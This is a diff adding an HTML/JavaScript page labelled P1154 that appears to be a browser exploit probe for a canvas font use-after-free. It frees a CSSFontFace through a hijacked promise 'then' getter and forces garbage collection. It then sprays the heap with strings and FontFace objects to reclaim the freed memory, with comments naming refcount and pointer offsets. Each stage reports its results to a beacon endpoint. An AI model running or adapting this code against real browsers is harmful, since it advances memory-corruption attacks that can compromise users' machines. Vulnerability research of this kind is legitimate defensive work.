@@ -1,0 +1,259 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1154</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body>
+<canvas id="cv" width="600" height="100" style="display:none"></canvas>
+<canvas id="cv2" width="600" height="100" style="display:none"></canvas>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1154: CANVAS STALE FONT UAF TEST ===');
+log('info','Key idea: set canvas font BEFORE freeing CSSFontFace,');
+log('info','then measureText WITHOUT re-setting font = stale reference?');
+B('P1154-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var weakFF=null;
+var frFired=false;
+var startT=Date.now();
+
+// FinalizationRegistry
+var fr=new FinalizationRegistry(function(tag){
+  frFired=true;
+  B('P1154-FR','collected|dt='+(Date.now()-startT));
+});
+
+// Create font with distinctive metrics
+// Use a font that is DIFFERENT from monospace fallback
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0041-005A}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica),local(Arial)',{unicodeRange:'U+0041-005A'});
+document.fonts.add(ff);void ff.loaded;
+
+weakFF=new WeakRef(ff);
+fr.register(ff,'ff-'+r);
+
+// === STEP 1: Set canvas font BEFORE any freeing ===
+var cv=document.getElementById('cv');
+var ctx=cv.getContext('2d');
+var cv2=document.getElementById('cv2');
+var ctx2=cv2.getContext('2d');
+
+// Set the font on BOTH canvases while CSSFontFace is alive
+ctx.font='20px "y'+r+'"';
+ctx2.font='20px "y'+r+'", monospace';
+
+// Measure baselines with the live font
+var liveW1=ctx.measureText('ABCDEFGHIJ').width;
+var liveW2=ctx2.measureText('ABCDEFGHIJ').width;
+
+// Also get monospace baseline on a separate setting
+var ctxMono=document.createElement('canvas').getContext('2d');
+ctxMono.font='20px monospace';
+var monoW=ctxMono.measureText('ABCDEFGHIJ').width;
+var ctxArial=document.createElement('canvas').getContext('2d');
+ctxArial.font='20px Arial';
+var arialW=ctxArial.measureText('ABCDEFGHIJ').width;
+
+B('P1154-BASELINE','live1='+liveW1+'|live2='+liveW2+'|mono='+monoW+'|arial='+arialW);
+log('info','Baselines: live1='+liveW1+' live2='+liveW2+' mono='+monoW+' arial='+arialW);
+
+// === STEP 2: Trigger thenable rejection to free the font ===
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;
+  uafHit=true;
+  var self=this;
+  return function(resolve,reject){
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(self);}catch(e){}
+    document.body.offsetHeight;
+    self=null;
+    reject(new Error('freed'));
+  };
+},set:function(){}});
+
+ff=null;
+document.fonts.load('1em y'+r+', z'+r,'ABCDEFGHIJ').then(function(){},function(){});
+
+// === STEP 3: Clean up then getter at 200ms ===
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!uafHit){B('P1154-DONE','nohit');return;}
+
+  // Quick check: canvas font should still be set
+  B('P1154-P1','hit=true|ctxFont='+ctx.font+'|ctx2Font='+ctx2.font);
+
+  // Measure with stale font setting (NO re-set!)
+  var staleW1=ctx.measureText('ABCDEFGHIJ').width;
+  var staleW2=ctx2.measureText('ABCDEFGHIJ').width;
+  B('P1154-P1-STALE','stale1='+staleW1+'|stale2='+staleW2+'|live1='+liveW1+'|live2='+liveW2);
+},200);
+
+// === STEP 4: GC rounds to collect wrapper ===
+var gcRound=0;
+function doGC(){
+  gcRound++;
+  // Heavy GC pressure
+  var trash=[];
+  for(var g=0;g<2000;g++)trash.push(new ArrayBuffer(2048));
+  trash=null;
+  for(var g=0;g<10000;g++){var s=String(g).repeat(80);s=null;}
+  for(var g=0;g<5000;g++){var o={a:new Array(100)};o=null;}
+  for(var g=0;g<3000;g++){var b=new ArrayBuffer(512);b=null;}
+
+  var wr='?';
+  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
+  B('P1154-GC'+gcRound,'wr='+wr+'|fr='+frFired+'|dt='+(Date.now()-startT));
+
+  if(wr==='collected'){
+    doStaleTest();
+    return;
+  }
+  if(gcRound<10){
+    setTimeout(doGC,1500);
+  }else{
+    B('P1154-GC-FAIL','not collected after 10 rounds');
+    doStaleTest(); // try anyway
+  }
+}
+setTimeout(doGC,2000);
+
+var staleDone=false;
+function doStaleTest(){
+  if(staleDone)return;
+  staleDone=true;
+
+  var wr='?';
+  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
+  B('P1154-STALE-BEGIN','wr='+wr+'|fr='+frFired);
+  log('phase','--- Stale font test (wr='+wr+') ---');
+
+  // === TEST A: measureText with STALE canvas font (no re-set!) ===
+  // ctx and ctx2 still have their font set from before the free
+  var preSprayW1=-1, preSprayW2=-1;
+  try{preSprayW1=ctx.measureText('ABCDEFGHIJ').width;}catch(e){preSprayW1='ERR:'+e.message.substring(0,30);}
+  try{preSprayW2=ctx2.measureText('ABCDEFGHIJ').width;}catch(e){preSprayW2='ERR:'+e.message.substring(0,30);}
+  B('P1154-A-PRE','w1='+preSprayW1+'|w2='+preSprayW2+'|liveW1='+liveW1+'|mono='+monoW);
+
+  // === TEST B: Spray strings to reclaim 192B zone ===
+  log('phase','--- String spray: 3000 x 180-char ---');
+  var strSpray=[];
+  for(var k=0;k<3000;k++){
+    // Pattern: CCCCCCCC... (0x43 = 'C')
+    // At CSSFontFace offset +0 (refcount): 0x4343434343434343
+    // At offset +88 (heap ptr): 0x4343434343434343
+    strSpray.push('C'.repeat(180));
+  }
+  B('P1154-B-SPRAY','count='+strSpray.length);
+
+  // === TEST C: measureText AFTER spray with STALE font ===
+  var postSprayW1=-1, postSprayW2=-1;
+  try{postSprayW1=ctx.measureText('ABCDEFGHIJ').width;}catch(e){postSprayW1='ERR:'+e.message.substring(0,30);}
+  try{postSprayW2=ctx2.measureText('ABCDEFGHIJ').width;}catch(e){postSprayW2='ERR:'+e.message.substring(0,30);}
+  B('P1154-C-POST','w1='+postSprayW1+'|w2='+postSprayW2);
+
+  // Did widths CHANGE between pre-spray and post-spray?
+  var changed1=(preSprayW1!==postSprayW1);
+  var changed2=(preSprayW2!==postSprayW2);
+  // Did widths DIFFER from live baseline?
+  var diffFromLive1=(postSprayW1!==liveW1);
+  var diffFromLive2=(postSprayW2!==liveW2);
+  var diffFromMono1=(postSprayW1!==monoW);
+
+  B('P1154-C-DIFF','ch1='+changed1+'|ch2='+changed2+'|dfL1='+diffFromLive1+'|dfL2='+diffFromLive2+'|dfM1='+diffFromMono1);
+
+  if(changed1||changed2){
+    log('win','!!! WIDTH CHANGED AFTER SPRAY — STALE DATA READ !!!');
+    B('P1154-UAF-MAYBE','pre1='+preSprayW1+'|post1='+postSprayW1+'|pre2='+preSprayW2+'|post2='+postSprayW2);
+  }
+
+  // === TEST D: fillText with stale font (trigger actual rendering) ===
+  try{
+    ctx.fillStyle='#ff0000';
+    ctx.fillText('ABCDEFGHIJ',10,40);
+    // Read pixels to see what was rendered
+    var pix=ctx.getImageData(0,0,600,50);
+    var nonZero=0;
+    for(var i=0;i<pix.data.length;i+=4){
+      if(pix.data[i]>0||pix.data[i+1]>0||pix.data[i+2]>0)nonZero++;
+    }
+    B('P1154-D-RENDER','nonZeroPixels='+nonZero);
+  }catch(e){B('P1154-D-RENDER','ERR:'+e.message.substring(0,40));}
+
+  // === TEST E: Re-set font and compare ===
+  try{
+    ctx.font='20px "y'+r+'"';
+    var resetW=ctx.measureText('ABCDEFGHIJ').width;
+    B('P1154-E-RESET','resetW='+resetW+'|monoW='+monoW+'|liveW1='+liveW1);
+  }catch(e){B('P1154-E-RESET','ERR:'+e.message.substring(0,30));}
+
+  // === TEST F: fonts.load deep access (P1153 backup) ===
+  var chk='';
+  try{chk=document.fonts.check('1em y'+r);}catch(e){chk='err:'+e.message.substring(0,20);}
+  B('P1154-F-CHECK','check='+chk+'|sz='+document.fonts.size);
+
+  try{
+    document.fonts.load('1em y'+r).then(
+      function(arr){
+        B('P1154-F-LOAD','resolved|len='+(arr?arr.length:'?'));
+        if(arr&&arr.length>0){
+          for(var i=0;i<arr.length&&i<3;i++){
+            var fam='',stat='';
+            try{fam=arr[i].family;}catch(e){fam='ERR';}
+            try{stat=arr[i].status;}catch(e){stat='ERR';}
+            B('P1154-F-FF'+i,'fam='+fam+'|stat='+stat);
+          }
+        }
+        finishUp();
+      },
+      function(e){
+        B('P1154-F-LOAD','rejected|msg='+(e?e.message:'?'));
+        finishUp();
+      }
+    );
+  }catch(e){
+    B('P1154-F-LOAD','threw|msg='+e.message.substring(0,40));
+    finishUp();
+  }
+
+  // === TEST G: FontFace spray (same-type reclaim) ===
+  var ffSpray=[];
+  var wts=['100','200','300','400','500','600','700','800','900'];
+  for(var k=0;k<200;k++){
+    try{
+      var nf=new FontFace('spray'+r+'x'+k,'local(Courier)',{weight:wts[k%9]});
+      document.fonts.add(nf);
+      ffSpray.push(nf);
+    }catch(e){}
+  }
+  B('P1154-G-FFSPRAY','count='+ffSpray.length);
+
+  // After FontFace spray: try stale canvas again
+  var postFFW1=-1;
+  try{
+    // Don't re-set ctx2 font — it's still stale
+    postFFW1=ctx2.measureText('ABCDEFGHIJ').width;
+  }catch(e){postFFW1='ERR';}
+  B('P1154-G-STALE-POST','w='+postFFW1+'|changed='+(postFFW1!==postSprayW2));
+
+  // Check fonts.check after same-type spray
+  var chkG='';
+  try{chkG=document.fonts.check('1em y'+r);}catch(e){chkG='err';}
+  B('P1154-G-CHECK','check='+chkG);
+}
+
+function finishUp(){
+  // Summary
+  var wr='?';
+  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
+  B('P1154-SUMMARY','wr='+wr+'|fr='+frFired+'|uafHit='+uafHit+'|dt='+(Date.now()-startT));
+  B('P1154-DONE','complete');
+}
+
+// Fallback finishUp if fonts.load takes too long
+setTimeout(function(){finishUp();},25000);
+</script></body></html>
